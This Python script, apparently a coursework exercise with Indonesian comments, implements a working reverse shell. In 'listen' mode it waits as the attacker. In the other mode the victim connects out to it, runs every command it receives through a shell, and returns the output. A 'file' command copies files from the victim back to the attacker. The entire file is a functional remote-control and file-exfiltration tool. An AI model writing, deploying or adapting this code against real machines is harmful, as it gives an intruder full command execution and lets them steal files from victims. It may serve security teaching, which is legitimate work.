import sys
from getopt import getopt
from socket import socket, AF_INET, SOCK_STREAM
import os
from subprocess import PIPE, Popen

HOST = ""
PORT = ""
IS_LISTEN = False

# python3 week5.py -h 127.0.0.1 -p 1234 -l
# python3 week5.py -h 127.0.0.1 -p 1234

# File Extraction
def read_arguments():
    global HOST, PORT, IS_LISTEN
    try:
        opts, _ = getopt(sys.argv[1:], 'h:p:l', ['host=', 'port=', 'listen']);
        
        for key, value in opts:
            if key in ['-h', '--host']:
                HOST = value
            elif key in ['-p', '--port']:
                PORT = int(value)
            elif key in ['-l', '--listen']:
                IS_LISTEN = True
    except Exception as error:
        print(f"[!] Error receiving the argument: {error}")
    
def send_command(att_sck: socket, vic_sck: socket):
    try:
        command = input()
        vic_sck.send(command.encode())
        print(f"Sending Command: {command}")

        if command == 'exit':
            att_sck.close()
            vic_sck.close()
            sys.exit(1)
        elif command.startswith("file "):
            # Nerima satu file full
            # file_name = command.split(' ')[1] + "result"
            # file = open(file_name, 'wb')
            # content = vic_sck.recv(1024)
            # file.write(content)
            # file.close()
            # print(f'[*] File {file_name} has been retrieved!')

            # Nerima per byte
            file_name = command.split(' ')[1]
            file = open(file_name + "result", 'wb')

            contents = ""
            while True:
                content = vic_sck.recv(1024)
                print(f"content: {content.decode()}")
                print("In a loop")
                if(content.decode() != 'done'):
                    contents += content.decode()
                    # print(f"contents:\n{contents}")
                else:
                    print("done found")
                    file.write(contents.encode())
                    file.close()
                    break;
            print('udh keluar bang')
    except Exception as error:
        print(f"[!] Error while sending command: {error}")
        att_sck.close()
        vic_sck.close()
        sys.exit(1)

def receive_command(att_sck: socket, vic_sck: socket):
    try:
        result = vic_sck.recv(1024).decode()
        print(result)
    except Exception as error:
        print(f"[!] Error while processing command!: {error}")
        att_sck.close()
        sys.exit(1)

def attacker():
    att_sck = socket(AF_INET, SOCK_STREAM)
    att_sck.bind((HOST, PORT))
    att_sck.listen(1)
    print(f"[*] Attacker listening on {HOST}:{PORT}")

    vic_sck, vic_addr = att_sck.accept()
    print(f"[*] A Victim has connected from {vic_addr[0]}:{vic_addr[1]}")

    try:
        while True:
            send_command(att_sck, vic_sck)
            receive_command(att_sck, vic_sck)
    except KeyboardInterrupt:
        print(f"[!] Keyboard Interrupt detected. Exitting...")
        att_sck.close()
        vic_sck.close()
        sys.exit(1)

def process_command(vic_sck: socket):
    command = vic_sck.recv(1024).decode()

    if command[:2] == 'cd':
        try:
            os.chdir(command[3:])
            result = f"[*] Successfully change directory to {command[3:]}"
            vic_sck.send(result.encode())
        except Exception as error:
            result = f"[*] Change directory Error: {error}"
            vic_sck.send(result.encode())
    elif command.startswith("file "):
        try:
            file_name = command.split(' ')[1]
            file = open(file_name, "rb")

            # Ngirim langsung 1 file
            # contents = ""
            # for content in file:
            #     contents += content
            
            # file.close()
            # vic_sck.send(contents.encode())

            # Ngirim per byte
            for content in file:
                vic_sck.send(content)
                print("content:", content.decode())
            
            content = 'done'.encode()
            vic_sck.send(content)
            print("done")
            file.close()
            vic_sck.send(''.encode())
            result = "[!] File Retrieval Successful!".encode()
            vic_sck.send(result)
        except Exception as error:
            print("error")
            vic_sck.send(f"[!] Error during File Retrieval: {error}".encode())
    else:
        process = Popen(command, stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
        result, error = process.communicate()
        if result == b'':
            vic_sck.send(error)
        else:
            vic_sck.send(result)

def victim():
    vic_sck = socket(AF_INET, SOCK_STREAM)
    vic_sck.connect((HOST, PORT))
    print(f"[*] Connected to {HOST}:{PORT}")

    while True:
        process_command(vic_sck)

if __name__ == "__main__":
    read_arguments()

    if IS_LISTEN == True:
        attacker()
    else:
        victim()